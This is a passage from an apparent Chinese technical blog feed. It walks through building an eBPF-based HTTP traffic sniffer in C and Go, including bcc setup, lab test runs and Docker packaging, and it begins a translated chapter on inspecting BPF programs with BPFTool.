class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发送到用户模式代理的关闭事件的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// close系统调用的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line">    <span class="comment">// 连接的唯一id</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// 在该连接上写入的总字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="comment">// 在该连接上读取的总字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perf缓冲区向用户模式代理发送close事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_close_events);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_syscall_close</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                            <span class="keyword">const</span> struct <span class="keyword">close_args_t</span>* close_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret_val = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="comment">// 如果系统调用失败，直接return</span></span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)close_args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 正在关闭的fd，并不代表IPV4套接字fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向用户模式代理发送一个指示连接已关闭的事件</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> <span class="title">close_event</span> = &#123;</span>&#125;;</span><br><span class="line">    close_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    close_event.conn_id = conn_info-&gt;conn_id;</span><br><span class="line">    close_event.rd_bytes = conn_info-&gt;rd_bytes;</span><br><span class="line">    close_event.wr_bytes = conn_info-&gt;wr_bytes;</span><br><span class="line"></span><br><span class="line">    socket_close_events.perf_submit(ctx, &amp;close_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_close_event_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从映射中删除连接</span></span><br><span class="line">    conn_info_map.<span class="keyword">delete</span>(&amp;pid_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用户代理Go实现"><a href="#用户代理Go实现" class="headerlink" title="用户代理Go实现"></a>用户代理Go实现</h4><p>用户模式代理使用gobpf库编写。第一步是编译代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bpfModule := bcc.NewModule(<span class="keyword">string</span>(bpfSourceCodeContent), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">defer</span> bpfModule.Close()</span><br></pre></td></tr></table></figure><p>然后创建一个连接工厂，负责保存所有连接实例并打印就绪连接并删除不活动或格式错误的连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建连接工厂并将 1分钟设置为不活动阈值，这意味着在最后一分钟内未收到任何事件的连接将被关闭。</span></span><br><span class="line">connectionFactory := connections.NewFactory(time.Minute)</span><br><span class="line"><span class="comment">// 启动一个goroutine。每 10 秒运行一次并打印就绪连接并删除非活动或格式错误的连接。</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">connectionFactory.HandleReadyConnections()</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>加载 perf 缓冲区处理程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.LaunchPerfBufferConsumers(bpfModule, connectionFactory); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是关于单用户模式perf缓冲区处理程序的说明。</p><p>每个处理程序通过管道(inputChan)获取事件，并且每个事件的类型为字节数组([]byte)，对于每个事件，我们需要将其转换为go的数据结构表示。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConnID is a conversion of the following C-Struct into GO.</span></span><br><span class="line"><span class="comment">// struct conn_id_t &#123;</span></span><br><span class="line"><span class="comment">//    uint32_t pid;</span></span><br><span class="line"><span class="comment">//    int32_t fd;</span></span><br><span class="line"><span class="comment">//    uint64_t tsid;</span></span><br><span class="line"><span class="comment">// &#125;;.</span></span><br><span class="line"><span class="keyword">type</span> ConnID <span class="keyword">struct</span> &#123;</span><br><span class="line">PID <span class="keyword">uint32</span></span><br><span class="line">FD   <span class="keyword">int32</span></span><br><span class="line">TsID <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我们修复了事件的时间戳，因为内核模式返回单调时钟而不是实时时钟，最后，我们使用新事件更新连接对象字段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">socketCloseEventCallback</span><span class="params">(inputChan <span class="keyword">chan</span> []<span class="keyword">byte</span>, connectionFactory *connections.Factory)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> data := <span class="keyword">range</span> inputChan &#123;</span><br><span class="line">      <span class="keyword">if</span> data == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> event structs.SocketCloseEvent</span><br><span class="line">      <span class="keyword">if</span> err := binary.Read(bytes.NewReader(data), bpf.GetHostByteOrder(), &amp;event); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Printf(<span class="string">"Failed to decode received data: %+v"</span>, err)</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      event.TimestampNano += settings.GetRealTimeOffset()</span><br><span class="line">      connectionFactory.GetOrCreate(event.ConnID).AddCloseEvent(event)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一步是attach到钩子上。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.AttachKprobes(bpfModule); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="非docker环境"><a href="#非docker环境" class="headerlink" title="非docker环境"></a>非docker环境</h5><p>bcc工具安装</p><p>Ubuntu - Source</p><p>To build the toolchain from source, one needs:</p><ul><li>LLVM 3.7.1 or newer, compiled with BPF support (default=on)</li><li>Clang, built from the same tree as LLVM</li><li>cmake (&gt;=3.1), gcc (&gt;=4.7), flex, bison</li><li>LuaJIT, if you want Lua support</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="function">For <span class="title">Focal</span> <span class="params">(<span class="number">20.04</span><span class="number">.1</span> LTS)</span></span></span><br><span class="line">sudo apt install -y bison build-essential cmake flex git libedit-dev \</span><br><span class="line">  libllvm12 llvm<span class="number">-12</span>-dev libclang<span class="number">-12</span>-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iovisor/bcc.git</span><br><span class="line">mkdir bcc/build; cd bcc/build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cmake -DPYTHON_CMD=python3 .. # build python3 binding</span><br><span class="line">pushd src/python/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">popd</span><br></pre></td></tr></table></figure><p>执行报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line"><span class="meta">#</span> github.com/iovisor/gobpf/bcc</span><br><span class="line">/root/go/pkg/mod/github.com/iovisor/gobpf@v0.2.0/bcc/module.go:230:132: not enough arguments in call to (_C2func_bcc_func_load)</span><br><span class="line">have (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, nil)</span><br><span class="line">want (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, *_Ctype_char, _Ctype_int)</span><br></pre></td></tr></table></figure><p>最后发现是bcc版本的问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -c http.proxy="http://192.168.19.16:17890" -b v0.21.0 https://github.com/iovisor/bcc.git</span><br></pre></td></tr></table></figure><p>启动ebpf sniffer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept" for "accept" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept" for "accept" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept4" for "accept4" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept4" for "accept4" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_write" for "write" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_write" for "write" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_read" for "read" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_read" for "read" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_close" for "close" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_close" for "close" as 1</span><br><span class="line">2022/09/29 08:19:13 Sniffer is ready</span><br></pre></td></tr></table></figure><p>启动服务端程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/demo-server# go run main.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>本地发送post请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro [16:19:17] [~]</span><br><span class="line"><span class="meta">-&gt;</span> % curl -X POST http://192.168.19.198:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;%</span><br></pre></td></tr></table></figure><p>sniffer查看获取到的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">========================&gt;</span><br><span class="line">Found HTTP payload</span><br><span class="line"><span class="meta">Request-&gt;</span></span><br><span class="line">POST /customResponse HTTP/1.1</span><br><span class="line">Host: 192.168.19.198:8080</span><br><span class="line">User-Agent: curl/7.77.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&#123;"size": 100&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">Response-&gt;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Date: Thu, 29 Sep 2022 08:19:21 GMT</span><br><span class="line">Content-Length: 113</span><br><span class="line"></span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;</span><br><span class="line"></span><br><span class="line">&lt;========================</span><br></pre></td></tr></table></figure><h5 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a>docker环境</h5><p>docker镜像打包，<code>Dockfile</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FROM golang:1.16-bullseye as builder</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line"></span><br><span class="line"># According to https://packages.debian.org/source/sid/bpfcc,</span><br><span class="line"># BCC build dependencies:</span><br><span class="line">RUN apt-get install -y arping bison clang-format cmake dh-python \</span><br><span class="line">  dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \</span><br><span class="line">  libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \</span><br><span class="line">  libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \</span><br><span class="line">  luajit python3-netaddr python3-pyroute2 python3-distutils python3 git</span><br><span class="line">ENV http_proxy http://192.168.19.16:17890</span><br><span class="line">ENV https_proxy http://192.168.19.16:17890</span><br><span class="line"># Install and compile BCC</span><br><span class="line">RUN git clone https://github.com/iovisor/bcc.git</span><br><span class="line">ENV http_proxy &apos;&apos;</span><br><span class="line">ENV https_proxy &apos;&apos;</span><br><span class="line">RUN mkdir bcc/build</span><br><span class="line">WORKDIR bcc/build</span><br><span class="line">RUN cmake ..</span><br><span class="line">RUN make</span><br><span class="line">RUN make install</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t sniffer:v1</span><br></pre></td></tr></table></figure><p>docker启动，<code>setup_docker.sh</code>如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line"></span><br><span class="line">ROOT_DIR=$(dirname $(dirname $(realpath "$&#123;0&#125;")))</span><br><span class="line">docker run --privileged --net=host -v $&#123;ROOT_DIR&#125;:/src -w /src/workshop1/capture-traffic \</span><br><span class="line">  -v /sys:/sys -v /lib:/lib -v /usr/src:/usr/src -it --rm sniffer:v1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;就目前而言，tcpdump是捕获生产中流量最常见的解决方案之一。但是缺点是它不允许应用程序级别的过滤(L7过滤)，因此每当捕获相关的HTTP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>使用BPF的Linux可观测性(下篇)-翻译</title>
    <link href="elssm.github.io/2022/05/29/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8B%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/</id>
    <published>2022-05-29T12:07:54.000Z</published>
    <updated>2022-06-04T03:06:37.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第五章节"><a href="#第五章节" class="headerlink" title="第五章节"></a>第五章节</h2><h3 id="BPF实用程序"><a href="#BPF实用程序" class="headerlink" title="BPF实用程序"></a>BPF实用程序</h3><p>到目前为止，我们已经讨论了如何编写BPF程序以在系统中获得更多可见性。多年来，许多开发人员都使用BPF构建了用于相同目的的工具。在本章中，我们将讨论一些你可以每天使用的现成工具。其中许多工具是你已经见过的一些BPF程序的高级版本。还有一些工具可以帮助你直接了解自己的BPF程序。</p><p>本章介绍了一些工具，可以在BPF的日常工作中对你有所帮助。我们首先介绍BPFTool，这是一个命令行实用程序，用于获取有关 BPF 程序的更多信息。我们涵盖了<code>BPFTrace</code>和<code>kubectl-trace</code>，它们会让你使用简洁的领域特定语言(DSL)有效地编写BPF程序。最后，我们谈谈<code>eBPF Exporter</code>，一个将BPF与Prometheus集成的开源项目。</p><h4 id="BPFTool"><a href="#BPFTool" class="headerlink" title="BPFTool"></a>BPFTool</h4><p>BPFTool是一个用于检查BPF程序和映射的内核实用程序。默认情况下，该工具不会安装在任何Linux发行版上，而且它正在大量开发中，因此需要最能支持你的Linux内核版本。这里我们介绍<code>Linux 5.1</code>版的BPFTool。</p><p>在接下来的部分中，我们将讨论如何将BPFTool安装到你的系统上，以及如何使用它来观察和更改BPF程序的行为和终端中的映射。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取内核源码。源码下载地址如下</span></span><br><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入tool目录</span></span><br><span class="line">cd linux-x.x/tools/bpf/bpftool</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装bpf</span></span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>可以通过检查其版本来检查BPFTool是否已正确安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool --version</span><br><span class="line">bpftool v5.17.0</span><br><span class="line">features: libbpf_strict</span><br></pre></td></tr></table></figure><h5 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h5><p>你可以使用BPFTool执行的基本操作之一是扫描系统以了解可以访问哪些BPF功能。 当你不记得哪个版本的内核引入了哪种程序或是否启用了<code>BPF JIT</code>编译器时，这种方法非常有用。要找出这些问题以及许多其他问题的答案，请运行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool feature </span><br><span class="line">Scanning system configuration...</span><br><span class="line">bpf() syscall for unprivileged users is enabled</span><br><span class="line">JIT compiler is enabled</span><br><span class="line">JIT compiler hardening is disabled</span><br><span class="line">JIT compiler kallsyms exports are enabled for root</span><br><span class="line">...</span><br><span class="line">Scanning system call availability...</span><br><span class="line">bpf() syscall is available</span><br><span class="line">Scanning eBPF program types...</span><br><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">...</span><br><span class="line">Scanning eBPF map types...</span><br><span class="line">eBPF map_type hash is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is availab</span><br></pre></td></tr></table></figure><p>在此输出中可以看到我们的系统允许非特权用户执行<code>syscall bpf</code>，此调用仅限于某些操作。 还可以看到JIT已启用。较新版本的内核默认启用此JIT，它对编译BPF程序有很大帮助。 如果你的系统没有启用它，您可以运行以下命令来启用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> 1 &gt; /proc/sys/net/core/bpf_jit_enable</span></span><br></pre></td></tr></table></figure><p>功能输出还显示了系统中启用了哪些程序类型和映射类型。这个命令提供的信息比我们在这里展示的要多得多，比如程序类型和许多其他配置指令支持的BPF助手。</p><h5 id="检查BPF程序"><a href="#检查BPF程序" class="headerlink" title="检查BPF程序"></a>检查BPF程序</h5><p>BPFTool为你提供有关内核上BPF程序的直接信息。它允许调查系统中已经运行的内容。还允许加载和固定以前从命令行编译的新的BPF程序。</p><p>学习如何使用BPFTool处理程序的最佳起点是检查你在系统中运行的内容。为此，可以运行命令<code>bpftool prog show</code>。 如果你使用<code>Systemd</code>作为你的init系统，那么可能已经加载了一些BPF程序并附加到一些cgroup；我们稍后再讨论这些。 运行该命令的输出将如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool prog show</span><br><span class="line">52: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">53: cgroup_skb  tag 2a142ef67aaad174</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">54: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 54,55</span><br></pre></td></tr></table></figure><p>左侧冒号前的数字是程序标识符；我们稍后会使用它们来调查这些程序的全部内容。从这个输出中还可以了解系统正在运行哪些类型的程序。在当前这种情况下，系统正在运行三个附加到cgroup套接字缓冲区的BPF程序。如果这些程序实际上是由<code>Systemd</code>启动的，则加载时间可能会与你启动系统时匹配。你还可以查看这些程序当前使用了多少内存以及与它们关联的映射的标识符。 所有这些乍一看都很有用，而且因为我们有程序标识符，我们可以更深入地进行研究。</p><p>你可以将程序标识符作为额外参数添加到前面的命令中：<code>bpftool prog show id 52</code>。这样，BPFTool将显示你之前看到的相同信息，但仅针对由ID 52标识的程序； 这样可以过滤掉你不需要的信息。 此命令还支持<code>--json</code>标志来生成一些JSON输出。如果你想操作输出，这个JSON输出非常方便。例如，像<code>jq</code>这样的工具会为你提供更结构化的数据格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog show --json id 52 | jq</span></span><br><span class="line"> &#123;</span><br><span class="line">  "id": 52,</span><br><span class="line">  "type": "cgroup_skb",</span><br><span class="line">  "tag": "7be49e3934a125ba",</span><br><span class="line">  "gpl_compatible": false,</span><br><span class="line">  "loaded_at": 1553816764,</span><br><span class="line">  "uid": 0,</span><br><span class="line">  "bytes_xlated": 296,</span><br><span class="line">  "jited": true,</span><br><span class="line">  "bytes_jited": 229,</span><br><span class="line">  "bytes_memlock": 4096,</span><br><span class="line">  "map_ids": [</span><br><span class="line">  52,</span><br><span class="line">  53</span><br><span class="line">  ] </span><br><span class="line"> 